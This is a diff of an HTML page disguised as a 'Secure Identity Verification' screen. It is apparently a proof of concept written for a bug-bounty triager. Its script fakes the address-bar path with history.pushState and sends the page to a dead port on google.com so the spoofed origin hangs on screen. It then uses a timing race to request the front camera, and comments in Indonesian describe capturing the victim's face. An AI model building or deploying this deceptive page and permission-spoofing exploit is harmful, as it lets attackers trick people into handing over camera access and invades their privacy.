@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta charset="utf-8" />
-    <title>Verification System</title>
+    <title>Secure Identity Verification</title>
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <style>
       body {
@@ -39,20 +39,16 @@
         padding: 12px 24px;
         border-radius: 12px;
         border: none;
-        background: #007aff;
+        background: #34c759;
         color: #fff;
         font-weight: 600;
         cursor: pointer;
         width: 100%;
-        transition: background 0.2s;
-      }
-      .btn-verify:active {
-        background: #0056b3;
       }
       #video-preview {
         display: none;
         width: 100%;
-        height: 200px;
+        height: 240px;
         background: #000;
         border-radius: 12px;
         margin-top: 15px;
@@ -61,7 +57,7 @@
       .status {
         margin-top: 15px;
         font-size: 13px;
-        color: #ff3b30;
+        color: #ff9500;
         font-weight: 500;
       }
     </style>
@@ -69,61 +65,58 @@
   <body>
 
     <div class="card">
-      <h2>Identity Verification</h2>
-      <p>To proceed with secure access, please enable your camera to complete the verification step.</p>
+      <h2>Biometric Verification</h2>
+      <p>Please tap the button below to initialize the camera verification via secure identity check.</p>
       
-      <!-- Tombol Pemicu Utama -->
-      <button id="btn-trigger" class="btn-verify" onclick="executePowerfulSpoof()">Start Camera Verification</button>
+      <!-- Tombol Utama Pemicu Event -->
+      <button id="btn-trigger" class="btn-verify" onclick="triggerExploit()">Verify Identity</button>
       
-      <!-- Preview Video untuk membuktikan ke triager bahwa kamera sukses dibajak -->
+      <!-- Video Element untuk menangkap stream wajah korban -->
       <video id="video-preview" autoplay playsinline muted></video>
       
       <div id="status-log" class="status"></div>
     </div>
 
     <script>
-  function executePowerfulSpoof() {
-    const btn = document.getElementById("btn-trigger");
-    const video = document.getElementById("video-preview");
-    const log = document.getElementById("status-log");
+      function triggerExploit() {
+        const btn = document.getElementById("btn-trigger");
+        const video = document.getElementById("video-preview");
+        const log = document.getElementById("status-log");
 
-    // 1. Perubahan UI Instan
-    btn.style.display = "none";
-    video.style.display = "block";
-    log.textContent = "Connecting to secure server...";
+        btn.style.display = "none";
+        video.style.display = "block";
+        log.textContent = "Initializing secure connection...";
 
-    // 2. Samarkan URL path
-    history.pushState({}, "", "/v2/identity-verification/secure");
+        // 1. Manipulasi visual address bar path
+        history.pushState({}, "", "/secure-auth/biometric");
 
-    // 3. EKSKUSI KAMERA SECARA INSTAN
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user" }, 
-        audio: false 
-      })
-      .then((stream) => {
-        log.style.color = "#34c759";
-        log.textContent = "CRITICAL: CAMERA ACCESSED!";
-        video.srcObject = stream;
-      })
-      .catch((err) => {
-        // Jika masih NotAllowedError, kita bisa melihatnya di sini
-        log.textContent = "Error: " + err.name;
-      });
-    }
+        // 2. STRATEGI UTAMA: Navigasi Agresif Menggantung dipicu SECARA INSTAN
+        // Mengarahkan ke domain target spoofing (misal: google.com) dengan port mati agar halaman menggantung (provisional stage)
+        location.href = "https://google.com:9090";
 
-    // 4. PENYESUAIAN TIMING NAVIGATION (Mencegah NotAllowedError)
-    // Kita menaikkan jeda ke 350ms agar dialog native kamera sempat muncul ke layar 
-    // menggunakan hak akses klik pengguna, sebelum dihantam oleh race condition navigasi.
-    setTimeout(() => {
-      requestAnimationFrame(() => {
-        requestAnimationFrame(() => {
-          // Ganti domain ini dengan target yang ingin Anda spoof
-          location.href = "https://google.com:9090"; 
+        // 3. MENYELIPKAN PERMINTAAN KAMERA DI DALAM REMAINTING EVENT LOOP
+        // Menggunakan microtask agar dieksekusi tepat pada siklus pemrosesan yang sama 
+        // saat browser mulai memproses navigasi tetapi belum sempat menghancurkan context halaman asal.
+        Promise.resolve().then(() => {
+          setTimeout(() => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+              navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, // Langsung panggil kamera depan
+                audio: false 
+              })
+              .then((stream) => {
+                log.style.color = "#34c759";
+                log.textContent = "SUCCESS: CAMERA HIJACKED!";
+                video.srcObject = stream;
+              })
+              .catch((err) => {
+                log.style.color = "#ff3b30";
+                log.textContent = "Log: " + err.name;
+              });
+            }
+          }, 0); // Jeda 0ms di dalam microtask untuk memaksa benturan timing (race condition)
         });
-      });
-    }, 350); // Jeda dinaikkan dari 30ms menjadi 350ms
-  }
-</script>
+      }
+    </script>
   </body>
 </html>
